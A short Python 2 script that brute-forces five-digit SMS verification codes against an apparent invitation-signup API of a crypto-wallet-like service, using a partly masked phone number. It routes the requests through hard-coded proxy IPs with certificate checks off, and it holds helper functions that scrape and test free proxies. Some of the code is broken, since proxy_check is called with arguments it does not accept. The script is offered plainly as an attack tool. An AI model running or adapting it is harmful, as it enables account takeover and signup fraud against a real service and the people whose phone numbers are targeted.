# -*- coding: utf-8 -*-
import requesocks as requests
import re
import os

def brute():
    for i in range(10000,99999):
        data={"countrycode":"86","phone":"1****59","verifycode":i}
        print i
        url='https://api.kcash.com/api/invitation/signup'
        proxy={'http': '116.209.53.235:9999'}
        r=requests.post(url=url,data=data,proxies=proxy,verify=False,timeout=6)
        print r.content
        print len(r.content)




#def proxy_check(ip,port,types):
def proxy_check():
    proxy ={}
    proxy[types.lower()] = '%s:%s' %(ip,port)
    print proxy
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36'}
    proxy = {'http': 'socks5://36.57.86.158:34392'}

    #try:
    s=requests.session()
    r=s.get('http://ip.tool.chinaz.com/',proxies=proxy,headers=headers,timeout=5)
    s.keep_alive = False
    #print r.content

    ip_content=re.findall(r'<dd class="fz24">(.*)</dd>',r.content,)
    print ip_content
    # if ip==ip_content:
    #     print proxy
    # except Exception,e:
    #     #print e
        #pass

def proxy_spider():
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36'}
    url = 'http://api3.xiguadaili.com/ip/?tid=557750600618076&num=100&protocol=https'
    r = requests.get(url=url, headers=headers)
    #print r.content
    a=r.content
    #print a
    b=a.split('\r\n')
    #print b
    for i in range(0,len(b)):
        c = b[i].split(':')
        try:
            proxy_check(c[0],c[1],types='http')
        except:
            pass

#proxy_spider()
brute()
proxy_check()
